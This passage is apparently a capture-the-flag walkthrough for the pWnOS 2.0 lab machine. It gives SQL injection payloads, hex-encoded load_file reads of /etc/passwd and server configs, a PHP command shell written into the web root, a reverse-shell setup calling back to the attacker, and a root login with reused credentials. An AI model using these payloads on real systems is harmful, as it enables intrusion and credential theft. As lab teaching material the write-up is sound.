&lt;li&gt;Located hard coded plain text credentials, which had been re-used, allowing for complete system access&lt;/li&gt;
&lt;/ul&gt;


&lt;a name="Tools"&gt;&lt;/a&gt;
&lt;h2&gt;Tools&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://pwnos.com/"&gt;pWnOS_v2.0.7z&lt;/a&gt; &lt;em&gt;(md5: 1eb0960c0ba29335230ada1df80cd22c)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;A virtual machine &lt;em&gt;(Example: &lt;a href="http://www.filehippo.com/download_vmware_player/"&gt;VMware Player&lt;/a&gt; or &lt;a href="http://www.filehippo.com/download_virtualbox/"&gt;Virtual Box&lt;/a&gt;)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://nixgeneration.com/~jaime/netdiscover/"&gt;Net Discover&lt;/a&gt; - &lt;em&gt;(Can be found in &lt;a href="http://www.backtrack-linux.org/downloads/"&gt;BackTrack 5&lt;/a&gt;)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.unicornscan.org/"&gt;Unicorn Scan&lt;/a&gt; - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://nmap.org/"&gt;NMap&lt;/a&gt; - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.mozilla.org/firefox/new/"&gt;Firefox&lt;/a&gt; - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.portswigger.net/burp/proxy.html"&gt;Burp Proxy&lt;/a&gt; - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://curl.haxx.se/"&gt;cURL&lt;/a&gt; - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell"&gt;php-reverse-shell&lt;/a&gt; - &lt;em&gt;(Can be found in BackTrack 5).&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://netcat.sourceforge.net/"&gt;Netcat&lt;/a&gt; - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://addons.mozilla.org/firefox/addon/tamper-data/"&gt;Tamper Data&lt;/a&gt; - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://sqlmap.org/"&gt;SQLMap&lt;/a&gt; - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;a name="Walkthrough"&gt;&lt;/a&gt;
&lt;h2&gt;Walkthrough&lt;/h2&gt;

&lt;p&gt;By reading "pWnOS_INFO-2_0.txt" &lt;em&gt;(aka the readme file)&lt;/em&gt;, the attacker discovers the IP range which the target is using, as well as the network configuration of the target &lt;em&gt;(it's using a static IP address of 10.10.10.100/24)&lt;/em&gt;. The attacker confirms the given information, by sweeping the network range and detecting a single node on the specified IP address, by using "net discover".&lt;/p&gt;

&lt;p&gt;After the attacker has changed their IP address to match the target's subnet, they then set out to discover what services the target has publicly exposed. "Unicorn Scan" quickly scans every TCP and UDP port belonging to the target, to reveal TCP 22 &lt;em&gt;(SSH)&lt;/em&gt; &amp;amp; TCP 80 &lt;em&gt;(HTTP)&lt;/em&gt; open. The attacker chooses to verify unicorn scan findings by repeating to scan every TCP port using "nmap". At the same time as scanning, they opt to use nmap's scripting engine to start emulating the services. This allows for the attacker to gather more information relating to the target. Nmap also confirms the same ports are open, plus the default ports are used for the default services &lt;em&gt;(for example SSH access on port 22 and a web server running on TCP 80)&lt;/em&gt;. The SSH service is normally used to remotely execute commands, and, due to its nature, normally requires a form of authentication before the user can access the service, so the attacker focuses on the web server... for now!&lt;/p&gt;

&lt;p&gt;The attacker interacts with the web server, by using "Firefox" to graphically render the web application on the target. Upon viewing the page, the attacker is presented with a form to fill in, to gain access to use the web application. On the right hand side, is a very small navigation menu to "home" &lt;em&gt;(which asks the attacker to login)&lt;/em&gt;, "register" &lt;em&gt;(allowing them to gain access)&lt;/em&gt; and to "login" &lt;em&gt;(same as "home" link)&lt;/em&gt;. In the login prompt, the attacker fills in the first field &lt;em&gt;(the email address)&lt;/em&gt;, with a single quote "'" and the password as "123". The justification for this is when web applications normally interact with backend databases; the command used to query the database consists of single quotes, around the variable(s). By adding an additional single quote, the attacker is able to see if the input fields have been sanitized &lt;em&gt;(escaping and filtering values)&lt;/em&gt;, which would protect the query command from being altered. The result of adding an extra single quote has led to the query command being left "open" as it hasn't got a closing/matching quote, that means the database can't be queried which causes an error. Because of the way the web application has been created and the web server is configured, the end user is displayed as an error message &lt;em&gt;(and by the looks of it a very detailed 'debug' message which is used for developing applications)&lt;/em&gt;. Inside the error message, it displays the failed query command which was sent to the database, this makes crafting an input value, to manipulate the database how the attacker chooses, very easy.&lt;/p&gt;

&lt;p&gt;As the attacker is going to be sending multiple requests to the target, in order to emulate the database, they use "burp proxy" to help construct the attack. The attacker starts burp to behave as a proxy, capturing all the data which will be sent through it, without modifying any requests. Afterwards the attacker then changes firefox's network settings to use burp as the proxy, meaning all the traffic, sent and received, in firefox will be monitored by burp.&lt;/p&gt;

&lt;p&gt;In order to perform an error based SQL injection attack, due to the hardcoded commands before the injection point, the attacker needs to emulate the table structure to use "&lt;a href="http://www.w3schools.com/sql/sql_union.asp"&gt;union&lt;/a&gt;" to 'select'/view values to alter the perform query. The first thing the attacker needs to know is the amount of columns used in the table into which they are injecting.&lt;/p&gt;

&lt;p&gt;The attacker goes back to the input form and enters in the email field an SQL command which is used to specify a column in the database, "&lt;a href="http://www.w3schools.com/php/php_mysql_order_by.asp"&gt;ORDERY BY&lt;/a&gt;". Inside burp, the attacker sends the requested value to burp's "intruder" feature. The attacker selects the area in the requested field, which each time will be modified. By using the "number" payload, each request will have a different numeric value. The attacker chooses to start at 1, ending at 10 and increasing in value by 1 with each request. If the returned result isn't what the attacker was expecting, they can increase the range and repeat the request. The attacker looks at the data which was produced due to each request. They look to see which column was first requested that caused an SQL error due to a column not existing. For this web application, the value was "9", therefore there are "8" columns in the database.&lt;/p&gt;

&lt;p&gt;The attacker tries to see if they are able to view the output value of their injected command. They now test the web application to see if it displays a certain table column in the end user's display. "Repeater" is another feature of burp, which allows for complete control and makes it easy to modify each request. The attacker crafts the query to cause a unique value to be displayed from each column from the database and they then try to see if they can locate any of the values in the web application. They soon discover that, column "4" is displayed publicly; therefore all the requests the attacker makes, which they wish to see the result of, must happen here. Using this, the attacker now discovers: the database user for the web application, the version of the MySQL and the database name being used.&lt;/p&gt;

&lt;p&gt;The attacker progresses by instead of emulating the database, targeting the operating system. They start off by trying to discover the user accounts which have access to the system, by "loading" &lt;em&gt;("&lt;a href="http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_load-file"&gt;load_file&lt;/a&gt;")&lt;/em&gt; the file, "/etc/passwd", which contains various pieces of information on all the users. Upon requesting the file, the returned value is empty, which indicates to the attacker their input could have been filtered. A possible method of getting around this issue is to change the format of the requested filename to hex. Using the "decoder" feature in burp, the attacker converts the value into "ASCII hex". After placing the encoded value in the request, the attacker is now shown the contents of the file. Now using this method to read files, the attacker makes various requests to other files which could help them to understand how the target's operating system works. The first file they try to access uses a wild card value, "*", which returns all the matching values, however, like before, when the attacker didn't use hex, the value returned was blank. Using their own system to match the wildcard value they attempt the request again. This time it succeeds, showing the operating system type and version. &lt;em&gt;(Editor's note: see &lt;a href="http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_load-file"&gt;here&lt;/a&gt; for more possible values)&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;As the attacker now knows the operating system &amp;amp; software used and their versions, they try to read the default paths for their configuration files of the web server. By doing so, the attacker now knows the physical location of the web root folder on the operating system &lt;em&gt;(as it turns out, it's also the default location)&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;With the information gathered, the attacker tries to write their own file to the target in the web root folder. This would be accessible via the web service. In order for this to work, the database user needs to have permission to write files, as well as the web root folder being writable to MySQL user. The attacker hasn't checked to see if they have either permissions, however, they still try to write a simple PHP file, which when executed, performs the given command and displays the output &lt;em&gt;(See &lt;a href="http://php.net/manual/en/function.passthru.php"&gt;passthru&lt;/a&gt;)&lt;/em&gt;. Upon calling the file from the web server, along with the command, to display the current user, the attacker sees the result. This allows for the attacker to now execute commands with the same privileges as the web service.&lt;/p&gt;

&lt;p&gt;The attacker now wishes to upgrade their method of executing commands, and would like to have an interactive shell. They search to see if "netcat" is installed on the system, they discover it is. However, it is the "wrong" version for their needs. The OpenBSD version of netcat, doesn't have the "-e" argument, which allows for a program to be executed after a connection has been established, thus they are not able to create a shell using this method.&lt;/p&gt;

&lt;p&gt;Instead, the attacker uses PHP to create a shell. Pentest Monkey's PHP reserve shell is able to connect back from the target to the attacker by using just PHP functions. The attacker makes a copy of the file, updates it so that it uses their IP address, encodes it, then writes it as a new file on the target's machine. Because it is only executed when someone visits the page, the attacker quickly creates a listener to wait for the PHP shell to connect into. After the attacker "views" the page on the target, it causes the PHP code to be executed, causing a connection back to the attacker. The result, the attacker now has a interactive shell on the target.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(Editor's note: This is optional. The method below is a repeat of the stage(s) before, but is performed in a quicker manner.)&lt;/em&gt;
The attacker then repeats exploiting the same injection vulnerability, however using an automated tool, "sqlmap", which simplifes the process. As burp is no longer being used, the attacker removes the proxy configuration from firefox &lt;em&gt;(as well as quitting burp)&lt;/em&gt;. Before repeating to submit values into the login form again, the attacker enables the add-on, "Tamper Data" &lt;em&gt;(it comes with backtrack, however, its disabled by default)&lt;/em&gt;. This firefox add-on, allows for the attacker to easily view the header data which is sent and received from the target's web server.&lt;/p&gt;

&lt;p&gt;By taking the value captured from tamper data, when data was submited in the login form, the attacker feeds it into SQLMap, along with which URL to use and the field which is vulnerable. As before, the attacker uses the email field as the injection point for their SQL values. This is due to the error message displayed, as the password field is being altered before its being processed by the database &lt;em&gt;(the value has been hashed by a SHA1 format)&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;SQLMap now makes all the requests and is able to find the vulnerability, exploits it and reports back to the attacker the result, along with all the information gathered. The attacker then repeats emulating the database itself and the back end software used. The attacker makes SQLMap fully automated plus only displays the "core"/ necessarily output when requesting the "usernames" and "password" &lt;em&gt;(which SQLmap tried to crack the hashes for)&lt;/em&gt;. Afterwards the attacker requests all the database names in the MySQL server and gets sqlmap to display as much as possible to show the method in which it works. From there, the attacker then finds all the tables in the target's database, "ch16", with their field values, along with the number of entries, then the contents. After that, the attacker gains a 'SQL shell' on the target, and then reads the same user file, and lastly, ends with an 'OS shell' to gain remote command line access on the target.&lt;/p&gt;

&lt;p&gt;Using the first interactive shell, the attacker starts to emulate the targets machine in order to escape privileges. To start with, they discover basic information relating to the operating system, such as: which user they are currently using &lt;em&gt;(along with the user's group value)&lt;/em&gt;, various information relating to the kernel &lt;em&gt;(name, hostname, release, version, hardware name, processor type, hardware platform and operating system)&lt;/em&gt; and hostnames. They then move onto what's currently happening on the target, with network connections and running processors. Afterwards they start exploring the target's file system. After learning the current path, they check to see what files exist in the web root folder and look in "/var" &lt;em&gt;(This "normally" is used for files which are "meant" to be changed when the operating system is running generally)&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;The attacker spots an "interesting" filename, which also happens to be duplicated in the web folder and /var folder. After viewing the contents of the file, the attacker sees the file is designed to be used for the web server to interact with the database. As a result, the file has hard coded clear text credentials in it; however, the password values differ between the files.&lt;/p&gt;

&lt;p&gt;Due to the port scan at the start and emulating the target &lt;em&gt;(its running processors and network activity)&lt;/em&gt;, the attacker is aware the target is running an SSH service allowing for remote access into the system. The attacker views the configuration to see how the SSH service is running, and discovers that "root" login is enabled, which matches the username from the database files. At this point, the attacker tries to SSH into the box, matching the credentials in the database configuration. When they use the password from the web root folder, access is denied, however, when they use the second file from /var, they gain access into the system as the super user, root.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Game Over&lt;/strong&gt;&lt;/p&gt;

&lt;a name="Commands"&gt;&lt;/a&gt;
&lt;h2&gt;Commands&lt;/h2&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;span class="line-number"&gt;34&lt;/span&gt;
&lt;span class="line-number"&gt;35&lt;/span&gt;
&lt;span class="line-number"&gt;36&lt;/span&gt;
&lt;span class="line-number"&gt;37&lt;/span&gt;
&lt;span class="line-number"&gt;38&lt;/span&gt;
&lt;span class="line-number"&gt;39&lt;/span&gt;
&lt;span class="line-number"&gt;40&lt;/span&gt;
&lt;span class="line-number"&gt;41&lt;/span&gt;
&lt;span class="line-number"&gt;42&lt;/span&gt;
&lt;span class="line-number"&gt;43&lt;/span&gt;
&lt;span class="line-number"&gt;44&lt;/span&gt;
&lt;span class="line-number"&gt;45&lt;/span&gt;
&lt;span class="line-number"&gt;46&lt;/span&gt;
&lt;span class="line-number"&gt;47&lt;/span&gt;
&lt;span class="line-number"&gt;48&lt;/span&gt;
&lt;span class="line-number"&gt;49&lt;/span&gt;
&lt;span class="line-number"&gt;50&lt;/span&gt;
&lt;span class="line-number"&gt;51&lt;/span&gt;
&lt;span class="line-number"&gt;52&lt;/span&gt;
&lt;span class="line-number"&gt;53&lt;/span&gt;
&lt;span class="line-number"&gt;54&lt;/span&gt;
&lt;span class="line-number"&gt;55&lt;/span&gt;
&lt;span class="line-number"&gt;56&lt;/span&gt;
&lt;span class="line-number"&gt;57&lt;/span&gt;
&lt;span class="line-number"&gt;58&lt;/span&gt;
&lt;span class="line-number"&gt;59&lt;/span&gt;
&lt;span class="line-number"&gt;60&lt;/span&gt;
&lt;span class="line-number"&gt;61&lt;/span&gt;
&lt;span class="line-number"&gt;62&lt;/span&gt;
&lt;span class="line-number"&gt;63&lt;/span&gt;
&lt;span class="line-number"&gt;64&lt;/span&gt;
&lt;span class="line-number"&gt;65&lt;/span&gt;
&lt;span class="line-number"&gt;66&lt;/span&gt;
&lt;span class="line-number"&gt;67&lt;/span&gt;
&lt;span class="line-number"&gt;68&lt;/span&gt;
&lt;span class="line-number"&gt;69&lt;/span&gt;
&lt;span class="line-number"&gt;70&lt;/span&gt;
&lt;span class="line-number"&gt;71&lt;/span&gt;
&lt;span class="line-number"&gt;72&lt;/span&gt;
&lt;span class="line-number"&gt;73&lt;/span&gt;
&lt;span class="line-number"&gt;74&lt;/span&gt;
&lt;span class="line-number"&gt;75&lt;/span&gt;
&lt;span class="line-number"&gt;76&lt;/span&gt;
&lt;span class="line-number"&gt;77&lt;/span&gt;
&lt;span class="line-number"&gt;78&lt;/span&gt;
&lt;span class="line-number"&gt;79&lt;/span&gt;
&lt;span class="line-number"&gt;80&lt;/span&gt;
&lt;span class="line-number"&gt;81&lt;/span&gt;
&lt;span class="line-number"&gt;82&lt;/span&gt;
&lt;span class="line-number"&gt;83&lt;/span&gt;
&lt;span class="line-number"&gt;84&lt;/span&gt;
&lt;span class="line-number"&gt;85&lt;/span&gt;
&lt;span class="line-number"&gt;86&lt;/span&gt;
&lt;span class="line-number"&gt;87&lt;/span&gt;
&lt;span class="line-number"&gt;88&lt;/span&gt;
&lt;span class="line-number"&gt;89&lt;/span&gt;
&lt;span class="line-number"&gt;90&lt;/span&gt;
&lt;span class="line-number"&gt;91&lt;/span&gt;
&lt;span class="line-number"&gt;92&lt;/span&gt;
&lt;span class="line-number"&gt;93&lt;/span&gt;
&lt;span class="line-number"&gt;94&lt;/span&gt;
&lt;span class="line-number"&gt;95&lt;/span&gt;
&lt;span class="line-number"&gt;96&lt;/span&gt;
&lt;span class="line-number"&gt;97&lt;/span&gt;
&lt;span class="line-number"&gt;98&lt;/span&gt;
&lt;span class="line-number"&gt;99&lt;/span&gt;
&lt;span class="line-number"&gt;100&lt;/span&gt;
&lt;span class="line-number"&gt;101&lt;/span&gt;
&lt;span class="line-number"&gt;102&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;netdiscover -r 10.10.10.0/24
&lt;/span&gt;&lt;span class="line"&gt;ifconfig eth0
&lt;/span&gt;&lt;span class="line"&gt;!! 10.10.10.40/24
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;10.10.10.100    &lt;span class="c"&gt;# target's IP&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;us -mT -Iv 1&lt;span class="nv"&gt;$ip&lt;/span&gt;:a -r &lt;span class="m"&gt;3000&lt;/span&gt; -R &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; us -mU -Iv &lt;span class="nv"&gt;$ip&lt;/span&gt;:a -r &lt;span class="m"&gt;3000&lt;/span&gt; -R 3
&lt;/span&gt;&lt;span class="line"&gt;nmap -p 1-65535 -T4 -A -v &lt;span class="nv"&gt;$ip&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;firefox &lt;span class="nv"&gt;$ip&lt;/span&gt; &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;// firefox -&amp;gt; login -&amp;gt; username: &lt;span class="s1"&gt;' , password: 123              #SELECT * FROM users WHERE email='''&lt;/span&gt; AND &lt;span class="nv"&gt;pass&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'356a192b7913b04c54574d18c28d46e6395428ab'&lt;/span&gt; AND active IS NULL
&lt;/span&gt;&lt;span class="line"&gt;// firefox -&amp;gt; login -&amp;gt; username: &lt;span class="s1"&gt;' or 1 =1-- -, password: 123   #SELECT * FROM users WHERE email='' or 1 =1-- -'&lt;/span&gt; AND &lt;span class="nv"&gt;pass&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'356a192b7913b04c54574d18c28d46e6395428ab'&lt;/span&gt; AND active IS NULL
&lt;/span&gt;&lt;span class="line"&gt;// BT -&amp;gt; Backtrack -&amp;gt; Applications -&amp;gt; Vulnerability Assessment -&amp;gt; Web Application Assessment -&amp;gt; Web Application Proxies -&amp;gt; burpsuite  &lt;span class="c"&gt;# Okay, I accept&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;// Burp -&amp;gt; Proxy -&amp;gt; Intercept -&amp;gt; Off. Proxy -&amp;gt; Options -&amp;gt; Port: 8080.
&lt;/span&gt;&lt;span class="line"&gt;// Firefox -&amp;gt; Edit -&amp;gt; Preferences -&amp;gt; Advance -&amp;gt; Network -&amp;gt; Settings -&amp;gt; Manual proxy configurations -&amp;gt; 127.0.0.1:8080
&lt;/span&gt;&lt;span class="line"&gt;// firefox -&amp;gt; login -&amp;gt; username: &lt;span class="s1"&gt;' ORDER BY 1-- -, password: 123  #username: '&lt;/span&gt; UNION SELECT 1-- -, password: &lt;span class="m"&gt;123&lt;/span&gt; &lt;span class="c"&gt;# for i in $(seq 1 10); do x=`seq 1 $i | tr '&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;' '&lt;/span&gt;,&lt;span class="s1"&gt;'`; echo &amp;quot;${x%?}&amp;quot;; done &amp;gt; /tmp/sqli&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;// Burp -&amp;gt; target -&amp;gt; site map -&amp;gt; right click -&amp;gt; send to intruder&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;// Burp -&amp;gt; intruder -&amp;gt; position -&amp;gt; clear § -&amp;gt; highlight: 1 -&amp;gt; Add: § # email='&lt;/span&gt; ORDER BY §1§-- -&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;pass&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;123&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;submit&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Login&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;submitted&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;TRUE  &lt;span class="c"&gt;# Add: § # email=' UNISON SELECT §1§-- -&amp;amp;pass=123&amp;amp;submit=Login&amp;amp;submitted=TRUE&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;// Burp -&amp;gt; intruder -&amp;gt; payload -&amp;gt; numbers -&amp;gt; from: &lt;span class="m"&gt;0&lt;/span&gt; -&amp;gt; to: &lt;span class="m"&gt;10&lt;/span&gt; -&amp;gt; Step: &lt;span class="m"&gt;1&lt;/span&gt;   &lt;span class="c"&gt;# preset list -&amp;gt; load -&amp;gt; /tmp/sqli&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;// Burp -&amp;gt; &lt;span class="o"&gt;(&lt;/span&gt;toolbar&lt;span class="o"&gt;)&lt;/span&gt; intruder -&amp;gt; start attack
&lt;/span&gt;&lt;span class="line"&gt;// Burp -&amp;gt; response  &lt;span class="c"&gt;# 10&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;// firefox -&amp;gt; login -&amp;gt; username: &lt;span class="s1"&gt;' UNION SELECT 1,2,3,4,5,6,7,8-- -, password: 123 # Field is 4&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;// Burp -&amp;gt; (toolbar) intruder -&amp;gt; send request to repeater&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;// Burp -&amp;gt; repeater -&amp;gt; request -&amp;gt; params -&amp;gt; username: *Values below* -&amp;gt; Go&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;// '&lt;/span&gt; UNION SELECT 1,2,3,user&lt;span class="o"&gt;()&lt;/span&gt;,5,6,7,8-- -  &lt;span class="c"&gt;# root@localhost&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;// &lt;span class="s1"&gt;' UNION SELECT 1,2,3,version(),5,6,7,8-- -   # 5.1.54-1.ubuntu4&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;// '&lt;/span&gt; UNION SELECT 1,2,3,database&lt;span class="o"&gt;()&lt;/span&gt;,5,6,7,8-- - &lt;span class="c"&gt;# ch16&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;// &lt;span class="s1"&gt;' UNION SELECT 1,2,3,load_file(/etc/passwd),5,6,7,8-- -&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;// Burp -&amp;gt; decoder -&amp;gt; /etc/passwd -&amp;gt; encode as: ascii hex&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;// '&lt;/span&gt; UNION SELECT 1,2,3,load_file&lt;span class="o"&gt;(&lt;/span&gt;0x2f6574632f706173737764&lt;span class="o"&gt;)&lt;/span&gt;,5,6,7,8-- -
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#cd /pentest/web/dirb/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#./dirb http://$ip&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# /info # phpinfo() -&amp;gt; Configuration, Apache Enviroment, magic_quotes, safe_mode&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;// Burp -&amp;gt; decoder -&amp;gt; /etc/*-release -&amp;gt; encode as: ascii hex
&lt;/span&gt;&lt;span class="line"&gt;// &lt;span class="s1"&gt;' UNION SELECT 1,2,3,load_file(0x2f6574632f2a2d72656c65617365),5,6,7,8-- -&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;cat  /etc/*-release&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;ls /etc/*-release  #lsb-release&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;// Burp -&amp;gt; decoder -&amp;gt; /etc/lsb-release -&amp;gt; encode as: ascii hex&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;// '&lt;/span&gt; UNION SELECT 1,2,3,load_file&lt;span class="o"&gt;(&lt;/span&gt;0x2f6574632f6c73622d72656c65617365&lt;span class="o"&gt;)&lt;/span&gt;,5,6,7,8-- -
&lt;/span&gt;&lt;span class="line"&gt;// Burp -&amp;gt; decoder -&amp;gt; /etc/apache2/apache2.conf -&amp;gt; encode as: ascii hex
&lt;/span&gt;&lt;span class="line"&gt;// &lt;span class="s1"&gt;' UNION SELECT 1,2,3,load_file(0x2f6574632f617061636865322f617061636865322e636f6e66),5,6,7,8-- - #http://wiki.apache.org/httpd/DistrosDefaultLayout&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;// Burp -&amp;gt; decoder -&amp;gt; /etc/apache2/sites-enabled/000-default -&amp;gt; encode as: ascii hex&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;// '&lt;/span&gt; UNION SELECT 1,2,3,load_file&lt;span class="o"&gt;(&lt;/span&gt;0x2f6574632f617061636865322f73697465732d656e61626c65642f3030302d64656661756c74&lt;span class="o"&gt;)&lt;/span&gt;,5,6,7,8-- -   &lt;span class="c"&gt;#DocumentRoot /var/www&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;// &lt;span class="s1"&gt;' UNION SELECT null,null,,null,&amp;quot;&amp;quot;,null,,null,null null INTO DUMPFILE &amp;quot;/var/www/evil.php&amp;quot;-- - # // '&lt;/span&gt; UNION SELECT null,null,,null&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;,null,,null,null null INTO OUTFILE &lt;span class="s2"&gt;&amp;quot;/var/www/evil.php&amp;quot;&lt;/span&gt;-- -
&lt;/span&gt;&lt;span class="line"&gt;curl --silent 10.10.10.100/evil.php?cmd&lt;span class="o"&gt;=&lt;/span&gt;id
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#cd /pentest/backdoors/web/webhandler&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#./webhandler.py --url &amp;quot;http://10.10.10.100/evil.php?cmd=&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;curl --silent 10.10.10.100/evil.php?cmd&lt;span class="o"&gt;=&lt;/span&gt;whereis nc
&lt;/span&gt;&lt;span class="line"&gt;curl --silent 10.10.10.100/evil.php?cmd&lt;span class="o"&gt;=&lt;/span&gt;file nc
&lt;/span&gt;&lt;span class="line"&gt;curl --silent 10.10.10.100/evil.php?cmd&lt;span class="o"&gt;=&lt;/span&gt;file /etc/alternatives/nc
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /pentest/backdoors/web/webshells/php/
&lt;/span&gt;&lt;span class="line"&gt;ll
&lt;/span&gt;&lt;span class="line"&gt;cp php-reverse-shell.php /tmp/evil2.php
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /tmp/
&lt;/span&gt;&lt;span class="line"&gt;vi evil2.php &lt;span class="c"&gt;# change ip: 10.10.10.40&lt;/span&gt;
